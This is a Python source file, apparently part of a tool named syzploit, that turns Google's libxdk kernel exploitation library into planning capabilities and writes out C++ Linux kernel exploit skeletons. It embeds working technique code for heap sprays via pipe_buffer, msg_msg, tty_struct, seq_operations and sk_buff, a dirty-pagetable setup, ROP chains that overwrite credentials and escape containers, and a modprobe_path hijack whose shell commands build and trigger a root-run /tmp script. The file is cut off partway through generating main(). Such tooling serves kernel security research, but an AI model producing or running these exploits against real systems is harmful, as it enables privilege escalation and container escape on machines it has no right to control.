"""
kernelresearch_adapter.py

Adapter for Google's kernel-research repository (libxdk/kernelXDK).
Extracts exploit primitives and ROP capabilities from libxdk headers
and generates corresponding PDDL capabilities.
"""

import os
import re
import subprocess
import sys
import textwrap
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple
from ..core import Primitive, PrimitiveRegistry, ExploitPlan
from ..btf_resolver import BTFData, resolve_offsets
from ...utils.debug import debug_print


def kr_debug(msg: str, enabled: bool = True):
    """Print debug message if enabled."""
    debug_print("KernelResearchAdapter", msg, enabled)


# RopActionId mapping from Target.h -> PDDL capabilities
# Based on enum struct RopActionId in libxdk/include/xdk/target/Target.h
ROPACTION_TO_CAPS = {
    'MSLEEP': {
        'caps': ['CAP_kernel_sleep', 'CAP_timing_control'],
        'description': 'Sleep in kernel context for timing/race conditions',
    },
    'COMMIT_INIT_TASK_CREDS': {
        'caps': ['CAP_privilege_escalation', 'CAP_cred_overwrite', 'CAP_root'],
        'description': 'Overwrite current task credentials with init_task creds for root',
    },
    'SWITCH_TASK_NAMESPACES': {
        'caps': ['CAP_namespace_escape', 'CAP_container_escape'],
        'description': 'Switch task namespaces to escape containers/sandboxes',
    },
    'WRITE_WHAT_WHERE_64': {
        'caps': ['CAP_arb_write', 'CAP_kernel_write', 'CAP_64bit_write'],
        'description': 'Arbitrary 64-bit write primitive in kernel memory',
    },
    'FORK': {
        'caps': ['CAP_fork', 'CAP_process_control'],
        'description': 'Fork a new process from kernel context',
    },
    'TELEFORK': {
        'caps': ['CAP_telefork', 'CAP_process_control'],
        'description': 'Telefork (fork + exec) from kernel context',
    },
    'RET2USR': {
        'caps': ['CAP_ret2usr', 'CAP_code_exec', 'CAP_rip_control'],
        'description': 'Return to userspace code execution',
    },
}

# Additional capabilities from libxdk components
LIBXDK_COMPONENTS = {
    'PayloadBuilder': {
        'caps': ['CAP_rop_chain', 'CAP_payload_gen'],
        'description': 'ROP chain and payload construction',
        'header': 'payloads/PayloadBuilder.h',
    },
    'RopChain': {
        'caps': ['CAP_rop_chain', 'CAP_rip_control'],
        'description': 'ROP chain management and execution',
        'header': 'payloads/RopChain.h',
    },
    'StackPivot': {
        'caps': ['CAP_stack_pivot', 'CAP_rip_control'],
        'description': 'Stack pivoting for ROP chain setup',
        'header': 'pivot/StackPivot.h',
    },
    'PivotFinder': {
        'caps': ['CAP_gadget_finder', 'CAP_stack_pivot'],
        'description': 'Find stack pivot gadgets in kernel binary',
        'header': 'pivot/PivotFinder.h',
    },
    'LeakedBuffer': {
        'caps': ['CAP_info_leak', 'CAP_kaslr_bypass'],
        'description': 'Handle leaked kernel data for KASLR bypass',
        'header': 'leak/LeakedBuffer.h',
    },
    'Target': {
        'caps': ['CAP_target_detection'],
        'description': 'Target environment detection (kernelCTF, etc.)',
        'header': 'target/Target.h',
    },
    'TargetDb': {
        'caps': ['CAP_symbol_resolution', 'CAP_struct_info'],
        'description': 'Symbol and structure database for targets',
        'header': 'target/TargetDb.h',
    },
}

# Exploit technique capabilities (from samples)
EXPLOIT_TECHNIQUES = {
    'pipe_buf_rop': {
        'caps': ['CAP_pipe_buf', 'CAP_rop_chain', 'CAP_heap_spray'],
        'description': 'Pipe buffer based ROP exploitation',
    },
    'msg_msg': {
        'caps': ['CAP_msg_msg', 'CAP_heap_spray', 'CAP_cross_cache'],
        'description': 'msg_msg based heap exploitation',
    },
    'dirty_pagetable': {
        'caps': ['CAP_dirty_pagetable', 'CAP_arb_write'],
        'description': 'Dirty PageTable exploitation technique',
    },
    'cross_cache': {
        'caps': ['CAP_cross_cache', 'CAP_heap_spray'],
        'description': 'Cross-cache heap spray technique',
    },
}


class KernelResearchAdapter:
    """
    Adapter for kernel-research/libxdk repository.
    
    Extracts ROP actions, payload capabilities, and exploit techniques
    from libxdk headers and sample exploits.
    """
    
    def __init__(self, repo_path: Optional[str] = None, debug: bool = False) -> None:
        self.repo_path = repo_path
        self.debug = debug
        self._libxdk_path: Optional[Path] = None
        
        if repo_path:
            p = Path(repo_path)
            if p.exists():
                # Check if it's the kernel-research root or libxdk directly
                if (p / 'libxdk').exists():
                    self._libxdk_path = p / 'libxdk'
                elif (p / 'include' / 'xdk').exists():
                    self._libxdk_path = p
                    
        kr_debug(f"KernelResearchAdapter initialized", self.debug)
        kr_debug(f"  repo_path: {repo_path}", self.debug)
        kr_debug(f"  libxdk_path: {self._libxdk_path}", self.debug)

    def available(self) -> bool:
        """Check if kernel-research repo is available."""
        return bool(self.repo_path and os.path.isdir(self.repo_path))

    def _scan_rop_actions(self) -> Dict[str, Dict[str, Any]]:
        """Scan Target.h for RopActionId enum values."""
        if not self._libxdk_path:
            return ROPACTION_TO_CAPS
        
        target_h = self._libxdk_path / 'include' / 'xdk' / 'target' / 'Target.h'
        if not target_h.exists():
            kr_debug(f"Target.h not found at {target_h}", self.debug)
            return ROPACTION_TO_CAPS
        
        kr_debug(f"Scanning Target.h for RopActionId enum", self.debug)
        
        try:
            content = target_h.read_text()
            # Find enum struct RopActionId
            match = re.search(r'enum\s+struct\s+RopActionId\s*:\s*\w+\s*\{([^}]+)\}', content)
            if match:
                enum_body = match.group(1)
                # Parse entries like MSLEEP = 0x01,
                for entry in re.finditer(r'(\w+)\s*=\s*0x[\da-fA-F]+', enum_body):
                    action_name = entry.group(1)
                    if action_name not in ROPACTION_TO_CAPS:
                        kr_debug(f"  Found new RopActionId: {action_name}", self.debug)
                        # Add with generic caps
                        ROPACTION_TO_CAPS[action_name] = {
                            'caps': ['CAP_rop_action', f'CAP_{action_name.lower()}'],
                            'description': f'ROP action: {action_name}',
                        }
        except Exception as e:
            kr_debug(f"Error scanning Target.h: {e}", self.debug)
        
        return ROPACTION_TO_CAPS

    def _scan_components(self) -> Dict[str, Dict[str, Any]]:
        """Scan libxdk headers for available components."""
        if not self._libxdk_path:
            return LIBXDK_COMPONENTS
        
        include_dir = self._libxdk_path / 'include' / 'xdk'
        if not include_dir.exists():
            return LIBXDK_COMPONENTS
        
        kr_debug(f"Scanning libxdk components in {include_dir}", self.debug)
        
        for comp_name, comp_info in LIBXDK_COMPONENTS.items():
            header_path = include_dir / comp_info['header']
            if header_path.exists():
                kr_debug(f"  Found component: {comp_name}", self.debug)
            else:
                kr_debug(f"  Component not found: {comp_name} ({header_path})", self.debug)
        
        return LIBXDK_COMPONENTS

    def _scan_samples(self) -> List[Dict[str, Any]]:
        """Scan sample exploits to extract techniques used."""
        samples = []
        if not self._libxdk_path:
            return samples
        
        samples_dir = self._libxdk_path / 'samples'
        if not samples_dir.exists():
            return samples
        
        kr_debug(f"Scanning sample exploits in {samples_dir}", self.debug)
        
        for sample_dir in samples_dir.iterdir():
            if sample_dir.is_dir():
                exploit_cpp = sample_dir / 'exploit.cpp'
                if exploit_cpp.exists():
                    sample_info = {
                        'name': sample_dir.name,
                        'path': str(exploit_cpp),
                        'caps': [],
                    }
                    
                    try:
                        content = exploit_cpp.read_text()
                        # Look for technique indicators
                        if 'pipe' in content.lower():
                            sample_info['caps'].extend(['CAP_pipe_buf'])
                        if 'msg_msg' in content.lower():
                            sample_info['caps'].extend(['CAP_msg_msg'])
                        if 'cross' in content.lower() and 'cache' in content.lower():
                            sample_info['caps'].extend(['CAP_cross_cache'])
                        if 'RopChain' in content:
                            sample_info['caps'].extend(['CAP_rop_chain'])
                        if 'PayloadBuilder' in content:
                            sample_info['caps'].extend(['CAP_payload_gen'])
                        if 'commit_creds' in content.lower() or 'COMMIT_INIT_TASK_CREDS' in content:
                            sample_info['caps'].extend(['CAP_privilege_escalation'])
                    except Exception:
                        pass
                    
                    samples.append(sample_info)
                    kr_debug(f"  Sample {sample_dir.name}: {sample_info['caps']}", self.debug)
        
        return samples

    def list_primitives(self, registry: PrimitiveRegistry, debug: bool = False) -> List[Primitive]:
        """
        List all available primitives from kernel-research/libxdk.
        
        Extracts:
        - ROP actions from Target.h enum
        - Component capabilities from libxdk headers
        - Exploit techniques from sample exploits
        
        Args:
            registry: PrimitiveRegistry to add primitives to
            debug: Enable debug output
            
        Returns:
            List of Primitive objects
        """
        self.debug = debug or self.debug
        prims: List[Primitive] = []
        
        kr_debug("Listing kernel-research primitives...", self.debug)
        
        # Scan for ROP actions
        rop_actions = self._scan_rop_actions()
        for action_name, action_info in rop_actions.items():
            p = Primitive(
                name=f"xdk_rop_{action_name.lower()}",
                description=action_info.get('description', f'ROP action: {action_name}'),
                requirements={'rip_control': True},
                provides={
                    'caps': action_info.get('caps', []),
                    'rop_action': action_name,
                    'source': 'kernel-research/libxdk',
                }
            )
            registry.add(p)
            prims.append(p)
            kr_debug(f"  Added ROP action: {action_name} -> {action_info.get('caps', [])}", self.debug)
        
        # Scan for components
        components = self._scan_components()
        for comp_name, comp_info in components.items():
            p = Primitive(
                name=f"xdk_{comp_name.lower()}",
                description=comp_info.get('description', f'libxdk component: {comp_name}'),
                requirements={},
                provides={
                    'caps': comp_info.get('caps', []),
                    'component': comp_name,
                    'source': 'kernel-research/libxdk',
                }
            )
            registry.add(p)
            prims.append(p)
            kr_debug(f"  Added component: {comp_name} -> {comp_info.get('caps', [])}", self.debug)
        
        # Add exploit techniques
        for tech_name, tech_info in EXPLOIT_TECHNIQUES.items():
            p = Primitive(
                name=f"xdk_technique_{tech_name}",
                description=tech_info.get('description', f'Exploit technique: {tech_name}'),
                requirements={},
                provides={
                    'caps': tech_info.get('caps', []),
                    'technique': tech_name,
                    'source': 'kernel-research/libxdk',
                }
            )
            registry.add(p)
            prims.append(p)
            kr_debug(f"  Added technique: {tech_name} -> {tech_info.get('caps', [])}", self.debug)
        
        # Scan sample exploits
        samples = self._scan_samples()
        for sample in samples:
            if sample.get('caps'):
                p = Primitive(
                    name=f"xdk_sample_{sample['name']}",
                    description=f"Sample exploit: {sample['name']}",
                    requirements={},
                    provides={
                        'caps': list(set(sample.get('caps', []))),
                        'sample': sample['name'],
                        'source': 'kernel-research/libxdk',
                    }
                )
                registry.add(p)
                prims.append(p)
        
        kr_debug(f"  Total primitives: {len(prims)}", self.debug)
        return prims

    def generate_rop_chain(self, vmlinux: str, vmlinuz: Optional[str] = None) -> Optional[str]:
        """
        If rop_generator is present, generate a ROP chain.
        
        Args:
            vmlinux: Path to vmlinux ELF file
            vmlinuz: Optional path to compressed kernel image
            
        Returns:
            Path to generated ROP chain output file, or None
        """
        if not self.available():
            return None
            
        script = os.path.join(self.repo_path, 'rop_generator', 'angrop_rop_generator.py')
        if not os.path.exists(script):
            kr_debug(f"ROP generator script not found: {script}", self.debug)
            return None
            
        try:
            cmd = ['python3', script, vmlinux]
            if vmlinuz:
                cmd.append(vmlinuz)
                
            kr_debug(f"Running ROP generator: {' '.join(cmd)}", self.debug)
            
            with subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                  text=True) as proc:
                out, err = proc.communicate(timeout=120)
                
                # Write output to file
                out_path = os.path.join(os.getcwd(), 'outdir', 'generated_rop.txt')
                os.makedirs(os.path.dirname(out_path), exist_ok=True)
                with open(out_path, 'w') as f:
                    f.write(out)
                    
                kr_debug(f"ROP chain written to: {out_path}", self.debug)
                return out_path
                
        except subprocess.TimeoutExpired:
            kr_debug("ROP generator timed out", self.debug)
            return None
        except Exception as e:
            kr_debug(f"ROP generator error: {e}", self.debug)
            return None

    # ------------------------------------------------------------------ #
    #                    libxdk CODE GENERATION                           #
    # ------------------------------------------------------------------ #

    # Maps technique names → libxdk C++ code snippets for exploit skeleton
    TECHNIQUE_XDK_CODE: Dict[str, Dict[str, Any]] = {
        'pipe_buf_rop': {
            'includes': [
                '#include <xdk/payloads/PayloadBuilder.h>',
                '#include <xdk/payloads/RopChain.h>',
                '#include <xdk/pivot/StackPivot.h>',
                '#include <xdk/leak/LeakedBuffer.h>',
            ],
            'setup': textwrap.dedent("""\
                // Build ROP chain using libxdk PayloadBuilder
                xdk::PayloadBuilder builder(target);
                xdk::RopChain chain;
                chain.addAction(xdk::RopActionId::COMMIT_INIT_TASK_CREDS);
                chain.addAction(xdk::RopActionId::TELEFORK);
                auto payload = builder.build(chain);
            """),
            'trigger': textwrap.dedent("""\
                // Spray pipe_buffer objects to reclaim freed slab
                // pipe_buffer is 0x280 (640) bytes — kmalloc-1k
                int spray_pipes[SPRAY_COUNT][2];
                for (int i = 0; i < SPRAY_COUNT; i++) {
                    if (pipe(spray_pipes[i]) < 0) { perror("pipe"); return -1; }
                    // Write payload into pipe to populate pipe_buffer->page
                    write(spray_pipes[i][1], payload.data(), payload.size());
                }
            """),
        },
        'msg_msg': {
            'includes': [
                '#include <xdk/payloads/PayloadBuilder.h>',
                '#include <sys/msg.h>',
            ],
            'setup': textwrap.dedent("""\
                // msg_msg based heap spray — flexible size via msgsnd()
                // struct msg_msg header is 0x30 bytes, data follows inline
                int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
                if (msqid < 0) { perror("msgget"); return -1; }
            """),
            'trigger': textwrap.dedent("""\
                // Spray msg_msg objects of target slab size
                struct { long mtype; char mtext[TARGET_SIZE - 0x30]; } msg;
                msg.mtype = 1;
                for (int i = 0; i < SPRAY_COUNT; i++) {
                    memset(msg.mtext, 'A' + (i % 26), sizeof(msg.mtext));
                    if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) < 0) {
                        perror("msgsnd"); return -1;
                    }
                }
            """),
        },
        'dirty_pagetable': {
            'includes': [
                '#include <xdk/payloads/PayloadBuilder.h>',
                '#include <xdk/target/TargetDb.h>',
            ],
            'setup': textwrap.dedent("""\
                // Dirty PageTable: corrupt PTE to map physical memory
                // 1. Spray PTEs via mmap() regions
                // 2. Free target object that overlaps PTE page
                // 3. Reclaim with controlled PTE entries → AAR/AAW on physmem
                void *mapped_regions[PTE_SPRAY_COUNT];
                for (int i = 0; i < PTE_SPRAY_COUNT; i++) {
                    mapped_regions[i] = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                             MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
                    // Touch page to instantiate PTE
                    *(volatile char *)mapped_regions[i] = 0;
                }
            """),
            'trigger': textwrap.dedent("""\
                // After UAF free, PTE reclaim gives control of page mappings
                // Write a crafted PTE entry pointing to physmap of cred struct
                uint64_t crafted_pte = PHYS_ADDR | PTE_VALID | PTE_USER | PTE_RW;
                // Overwrite PTE via the reclaimed object
            """),
        },
        'cross_cache': {
            'includes': [
                '#include <xdk/target/TargetDb.h>',
            ],
            'setup': textwrap.dedent("""\
                // Cross-cache attack: free slab page back to page allocator
                // then reclaim from a different cache
                // 1. Fill target cache slab with objects
                // 2. Free all objects → slab page returned to buddy allocator
                // 3. Spray from attacker-controlled cache to reclaim that page
            """),
            'trigger': textwrap.dedent("""\
                // Step 1: Fill the victim cache slab completely
                // Step 2: Free all → page goes to buddy allocator
                // Step 3: Allocate from attacker cache to reclaim the page
                // Now attacker objects overlap victim's freed memory
            """),
        },
        'seq_operations': {
            'includes': [
                '#include <xdk/payloads/RopChain.h>',
                '#include <xdk/pivot/PivotFinder.h>',
            ],
            'setup': textwrap.dedent("""\
                // seq_operations spray — 4 function pointers in kmalloc-32
                // open() /proc/self/stat to allocate seq_operations
                int spray_fds[SPRAY_COUNT];
                for (int i = 0; i < SPRAY_COUNT; i++) {
                    spray_fds[i] = open("/proc/self/stat", O_RDONLY);
                    if (spray_fds[i] < 0) { perror("open /proc/self/stat"); }
                }
            """),
            'trigger': textwrap.dedent("""\
                // After reclaiming with corrupted seq_operations:
                // read() on the fd triggers seq_operations->start()
                // If we control the function pointer → RIP hijack
                char dummy[256];
                for (int i = 0; i < SPRAY_COUNT; i++) {
                    lseek(spray_fds[i], 0, SEEK_SET);
                    read(spray_fds[i], dummy, sizeof(dummy));
                }
            """),
        },
        'tty_struct': {
            'includes': [
                '#include <xdk/payloads/RopChain.h>',
                '#include <xdk/pivot/StackPivot.h>',
            ],
            'setup': textwrap.dedent("""\
                // tty_struct spray — 0x2b8 bytes in kmalloc-1k
                // open /dev/ptmx to allocate tty_struct objects
                int spray_ptmx[SPRAY_COUNT];
                for (int i = 0; i < SPRAY_COUNT; i++) {
                    spray_ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
                    if (spray_ptmx[i] < 0) { perror("open /dev/ptmx"); }
                }
            """),
            'trigger': textwrap.dedent("""\
                // Corrupted tty_struct->ops → tty_operations function table
                // ioctl() on corrupted ptmx fd triggers ops->ioctl → RIP hijack
                for (int i = 0; i < SPRAY_COUNT; i++) {
                    ioctl(spray_ptmx[i], 0, 0);  // triggers ops->ioctl
                }
            """),
        },
        'sk_buff': {
            'includes': [
                '#include <xdk/payloads/PayloadBuilder.h>',
            ],
            'setup': textwrap.dedent("""\
                // sk_buff spray via socket sendmsg/recvmsg
                // sk_buff data area is slab-allocated, flexible size
                int spray_sockets[SPRAY_COUNT][2];
                for (int i = 0; i < SPRAY_COUNT; i++) {
                    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockets[i]) < 0) {
                        perror("socketpair"); return -1;
                    }
                }
            """),
            'trigger': textwrap.dedent("""\
                // Send payload-sized messages to spray sk_buff data areas
                char spray_buf[TARGET_SIZE];
                memset(spray_buf, 0x41, sizeof(spray_buf));
                for (int i = 0; i < SPRAY_COUNT; i++) {
                    send(spray_sockets[i][0], spray_buf, sizeof(spray_buf), 0);
                }
            """),
        },
        'modprobe_hijack': {
            'includes': [],
            'setup': textwrap.dedent("""\
                // modprobe_path overwrite — write "/tmp/x" to kernel's modprobe_path
                // Then trigger unknown binary format → kernel executes /tmp/x as root
                // Requires: arbitrary kernel write primitive
            """),
            'trigger': textwrap.dedent("""\
                // 1. Overwrite modprobe_path with our script path
                const char new_path[] = "/tmp/x";
                // arb_write(modprobe_path_addr, new_path, sizeof(new_path));

                // 2. Create the payload script
                system("echo '#!/bin/sh' > /tmp/x");
                system("echo 'id > /tmp/pwned' >> /tmp/x");
                system("chmod +x /tmp/x");

                // 3. Trigger unknown binary format → executes /tmp/x as root
                system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy && chmod +x /tmp/dummy && /tmp/dummy");
            """),
        },
    }

    def generate_exploit_skeleton(
        self,
        plan: ExploitPlan,
        vmlinux: Optional[str] = None,
        output_dir: Optional[str] = None,
    ) -> Optional[str]:
        """
        Generate a C++ exploit skeleton using libxdk APIs.

        Produces an exploit.cpp that:
        - Includes correct libxdk headers for the chosen technique
        - Uses Target/TargetDb for symbol & offset resolution
        - Builds ROP chains via PayloadBuilder when needed
        - Has stubs for each plan step populated with technique-specific code

        Args:
            plan: Unified ExploitPlan from core.py
            vmlinux: Optional path to vmlinux for symbol resolution
            output_dir: Optional directory for output (default: cwd/outdir)

        Returns:
            Path to generated exploit.cpp, or None on failure
        """
        if not output_dir:
            output_dir = os.path.join(os.getcwd(), 'outdir')
        os.makedirs(output_dir, exist_ok=True)

        technique = (plan.exploitation_technique or plan.technique or '').lower()
        technique_key = self._match_technique(technique)

        kr_debug(f"Generating exploit skeleton for technique={technique_key}", self.debug)

        parts: List[str] = []

        # 1. Headers
        parts.append(self._generate_xdk_includes(technique_key))

        # 2. Plan metadata as comments
        parts.append(self._generate_plan_comment(plan))

        # 3. Constants & offsets (from BTF or plan)
        parts.append(self._generate_constants(plan, vmlinux))

        # 4. libxdk Target setup
        parts.append(self._generate_target_init())

        # 5. Technique-specific setup & trigger code
        parts.append(self._generate_technique_code(technique_key))

        # 6. Step stubs from plan
        parts.append(self._generate_step_stubs(plan))

        # 7. main()
        parts.append(self._generate_xdk_main(plan))

        exploit_code = '\n'.join(parts)
        out_path = os.path.join(output_dir, 'exploit.cpp')
        with open(out_path, 'w') as f:
            f.write(exploit_code)

        kr_debug(f"Exploit skeleton written to {out_path}", self.debug)
        return out_path

    def plan_actions_to_xdk(
        self,
        plan_actions: List[str],
    ) -> List[Dict[str, str]]:
        """
        Map PDDL plan action names to libxdk API calls.

        Args:
            plan_actions: List of PDDL action names from the planner

        Returns:
            List of dicts with 'action', 'xdk_api', 'code_snippet' keys
        """
        ACTION_TO_XDK = {
            # ROP / payload actions
            'prepare_rop_chain':     ('PayloadBuilder::build',
                                      'auto payload = builder.build(chain);'),
            'perform_stack_pivot':   ('StackPivot::pivot',
                                      'pivot.execute(payload);'),
            'execute_rop_payload':   ('RopChain::execute',
                                      'chain.execute();'),

            # Cred overwrite actions
            'commit_creds_prepare_kernel_cred': (
                'RopActionId::COMMIT_INIT_TASK_CREDS',
                'chain.addAction(xdk::RopActionId::COMMIT_INIT_TASK_CREDS);',
            ),
            'direct_cred_overwrite': (
                'RopActionId::WRITE_WHAT_WHERE_64',
                'chain.addAction(xdk::RopActionId::WRITE_WHAT_WHERE_64);',
            ),

            # Spray / reclaim (no libxdk API — plain syscalls)
            'spray_msg_msg':        ('msgsnd', 'msgsnd(msqid, &msg, sz, 0);'),
            'spray_pipe_buffer':    ('pipe+write', 'write(pipefd[1], buf, sz);'),
            'spray_tty_struct':     ('open /dev/ptmx', 'open("/dev/ptmx", O_RDWR);'),
            'spray_seq_operations': ('open /proc', 'open("/proc/self/stat", O_RDONLY);'),
            'spray_sk_buff':        ('sendmsg', 'send(sock, buf, sz, 0);'),
            'reclaim_freed_object': ('spray', '// reclaim via chosen spray object'),

            # Leak / bypass
            'bypass_kaslr':         ('LeakedBuffer::findKernelBase',
                                      'kernel_base = leaked.findKernelBase();'),

            # Namespace / sandbox
            'escape_container':     ('RopActionId::SWITCH_TASK_NAMESPACES',
                                      'chain.addAction(xdk::RopActionId::SWITCH_TASK_NAMESPACES);'),

            # Shell
            'spawn_root_shell':     ('RopActionId::TELEFORK',
                                      'chain.addAction(xdk::RopActionId::TELEFORK);'),
        }

        result = []
        for action in plan_actions:
            action_lower = action.lower().strip()
            if action_lower in ACTION_TO_XDK:
                api, snippet = ACTION_TO_XDK[action_lower]
                result.append({
                    'action': action,
                    'xdk_api': api,
                    'code_snippet': snippet,
                })
            else:
                result.append({
                    'action': action,
                    'xdk_api': 'N/A',
                    'code_snippet': f'// TODO: implement {action}',
                })
        return result

    # ---- private helpers for code generation ---- #

    def _match_technique(self, technique: str) -> str:
        """Fuzzy-match a technique string to a TECHNIQUE_XDK_CODE key."""
        technique = technique.lower().replace('-', '_').replace(' ', '_')
        if technique in self.TECHNIQUE_XDK_CODE:
            return technique
        # fuzzy: check if any key is a substring
        for key in self.TECHNIQUE_XDK_CODE:
            if key in technique or technique in key:
                return key
        # keyword matching
        keyword_map = {
            'pipe': 'pipe_buf_rop',
            'msg': 'msg_msg',
            'pagetable': 'dirty_pagetable',
            'pte': 'dirty_pagetable',
            'cross': 'cross_cache',
            'seq': 'seq_operations',
            'tty': 'tty_struct',
            'sk_buff': 'sk_buff',
            'skb': 'sk_buff',
            'modprobe': 'modprobe_hijack',
        }
        for kw, key in keyword_map.items():
            if kw in technique:
                return key
        return 'pipe_buf_rop'  # default fallback

    def _generate_xdk_includes(self, technique_key: str) -> str:
        """Generate #include block with libxdk headers for the technique."""
        lines = [
            '// Auto-generated exploit skeleton using kernel-research/libxdk',
            '// Generated by syzploit KernelResearchAdapter',
            '//',
            '// Build with:',
            '//   g++ -std=c++17 -I<libxdk>/include -o exploit exploit.cpp \\',
            '//       -L<libxdk>/build -lxdk -lpthread',
            '',
            '#define _GNU_SOURCE',
            '#include <cstdio>',
            '#include <cstdlib>',
            '#include <cstring>',
            '#include <unistd.h>',
            '#include <fcntl.h>',
            '#include <errno.h>',
            '#include <sys/types.h>',
            '#include <sys/mman.h>',
            '#include <sys/syscall.h>',
            '#include <sys/socket.h>',
            '#include <sys/ioctl.h>',
            '#include <sys/wait.h>',
            '#include <sched.h>',
            '#include <pthread.h>',
            '#include <stdint.h>',
            '',
            '// libxdk headers',
            '#include <xdk/target/Target.h>',
            '#include <xdk/target/TargetDb.h>',
        ]
        tech_info = self.TECHNIQUE_XDK_CODE.get(technique_key, {})
        for inc in tech_info.get('includes', []):
            lines.append(inc)
        lines.append('')
        return '\n'.join(lines)

    def _generate_plan_comment(self, plan: ExploitPlan) -> str:
        """Generate comment block with plan metadata."""
        lines = [
            '// =================== EXPLOIT PLAN ===================',
            f'// Vulnerability: {plan.vulnerability_type or "unknown"}',
            f'// Target struct: {plan.target_struct or "unknown"}',
            f'// Slab cache:    {plan.slab_cache or "unknown"}',
            f'// Technique:     {plan.exploitation_technique or plan.technique or "unknown"}',
            f'// Architecture:  {plan.target_arch or "unknown"}',
            f'// Kernel:        {plan.target_kernel or "unknown"}',
            f'// Platform:      {plan.platform or "unknown"}',
        ]
        if plan.notes:
            lines.append('//')
            for note in plan.notes[:5]:
                lines.append(f'// Note: {note}')
        lines.append('')
        return '\n'.join(lines)

    def _generate_constants(self, plan: ExploitPlan, vmlinux: Optional[str]) -> str:
        """Generate #define constants from plan offsets and BTF resolution."""
        lines = [
            '// =================== CONSTANTS ===================',
            '#ifndef SPRAY_COUNT',
            '#define SPRAY_COUNT 256',
            '#endif',
            '#ifndef PAGESZ',
            '#define PAGESZ 0x1000',
            '#endif',
            '#ifndef TARGET_SIZE',
        ]

        # Infer target slab size from plan
        slab = (plan.slab_cache or '').lower()
        size_match = re.search(r'(\d+)', slab)
        target_size = size_match.group(1) if size_match else '256'
        lines.append(f'#define TARGET_SIZE {target_size}')
        lines.append('#endif')
        lines.append('')

        # Emit plan constants
        for name, value in (plan.constants or {}).items():
            lines.append(f'#ifndef {name.upper()}')
            if isinstance(value, str) and not value.startswith('0x') and not value.isdigit():
                lines.append(f'#define {name.upper()} "{value}"')
            else:
                lines.append(f'#define {name.upper()} {value}')
            lines.append('#endif')

        # Emit BTF-resolved offsets if available
        offsets = plan.offsets or {}
        if vmlinux and not offsets:
            try:
                btf = resolve_offsets(vmlinux)
                if btf:
                    offsets = btf.to_offset_dict()
                    kr_debug(f"BTF resolved {len(offsets)} offsets from {vmlinux}", self.debug)
            except Exception as e:
                kr_debug(f"BTF resolution failed: {e}", self.debug)

        if offsets:
            lines.append('')
            lines.append('// =================== STRUCT OFFSETS ===================')
            lines.append('// Resolved via BTF / plan data — adjust if kernel changes')
            for name, value in offsets.items():
                define_name = f'OFFSET_{name.upper()}'
                if isinstance(value, int):
                    lines.append(f'#ifndef {define_name}')
                    lines.append(f'#define {define_name} 0x{value:x}')
                    lines.append(f'#endif')
                else:
                    lines.append(f'#ifndef {define_name}')
                    lines.append(f'#define {define_name} {value}')
                    lines.append(f'#endif')

        lines.append('')
        return '\n'.join(lines)

    def _generate_target_init(self) -> str:
        """Generate libxdk Target initialization boilerplate."""
        return textwrap.dedent("""\
            // =================== libxdk TARGET SETUP ===================
            static xdk::Target *g_target = nullptr;
            static xdk::TargetDb *g_target_db = nullptr;

            static int init_target(const char *vmlinux_path) {
                g_target = new xdk::Target();
                if (!g_target->detect()) {
                    fprintf(stderr, "[-] Target detection failed\\n");
                    return -1;
                }
                fprintf(stderr, "[+] Target: %s\\n", g_target->name().c_str());

                g_target_db = new xdk::TargetDb(vmlinux_path);
                if (!g_target_db->load()) {
                    fprintf(stderr, "[-] TargetDb load failed\\n");
                    return -1;
                }
                fprintf(stderr, "[+] TargetDb loaded: %zu symbols\\n",
                        g_target_db->symbolCount());
                return 0;
            }
        """)

    def _generate_technique_code(self, technique_key: str) -> str:
        """Generate setup/trigger functions for the chosen technique."""
        tech = self.TECHNIQUE_XDK_CODE.get(technique_key, {})
        setup = tech.get('setup', '// No technique-specific setup\n')
        trigger = tech.get('trigger', '// No technique-specific trigger\n')

        lines = [
            f'// =================== TECHNIQUE: {technique_key} ===================',
            '',
            f'static int technique_setup(void) {{',
            f'    fprintf(stderr, "[*] technique_setup ({technique_key})\\n");',
        ]
        for line in setup.strip().splitlines():
            lines.append(f'    {line}')
        lines.append('    return 0;')
        lines.append('}')
        lines.append('')
        lines.append(f'static int technique_trigger(void) {{')
        lines.append(f'    fprintf(stderr, "[*] technique_trigger ({technique_key})\\n");')
        for line in trigger.strip().splitlines():
            lines.append(f'    {line}')
        lines.append('    return 0;')
        lines.append('}')
        lines.append('')
        return '\n'.join(lines)

    def _generate_step_stubs(self, plan: ExploitPlan) -> str:
        """Generate function stubs for each plan step."""
        steps = plan.steps or []
        if not steps:
            return '// No plan steps defined\n'

        lines = ['// =================== PLAN STEPS ===================']
        for step in steps:
            name = step.get('name', 'unknown_step')
            desc = step.get('description', '')
            requires = step.get('requires', [])
            provides = step.get('provides', [])

            lines.append(f'/*')
            lines.append(f' * {name}: {desc}')
            if requires:
                lines.append(f' * Requires: {", ".join(requires)}')
            if provides:
                lines.append(f' * Provides: {", ".join(provides)}')
            lines.append(f' */')
            lines.append(f'static int {name}(void) {{')
            lines.append(f'    fprintf(stderr, "[*] {name}\\n");')
            lines.append(f'    // TODO: implement — {desc}')
            lines.append(f'    return 0;')
            lines.append(f'}}')
            lines.append('')
        return '\n'.join(lines)

    def _generate_xdk_main(self, plan: ExploitPlan) -> str:
        """Generate main() that wires together init, technique, and plan steps."""
        steps = plan.steps or []
        step_calls = '\n'.join(
            f'    if ({s.get("name", "unknown")}() < 0) goto fail;'
            for s in steps
        )
        if not step_calls:
            step_calls = '    // No plan steps to execute'

        return textwrap.dedent(f"""\
            // =================== MAIN ===================
            int main(int argc, char **argv) {{
                const char *vmlinux = (argc > 1) ? argv[1] : nullptr;

                fprintf(stderr, "[*] syzploit generated exploit — {plan.vulnerability_type or 'unknown'}\\n");
                fprintf(stderr, "[*] Technique: {plan.exploitation_technique or plan.technique or 'unknown'}\\n");

                // Initialize libxdk target detection (optional — graceful if libxdk unavailable)
                if (vmlinux) {{
                    if (init_target(vmlinux) < 0) {{
                        fprintf(stderr, "[!] Warning: libxdk init failed, continuing without\\n");
                    }}
                }}

                // Technique-specific setup
                if (technique_setup() < 0) {{
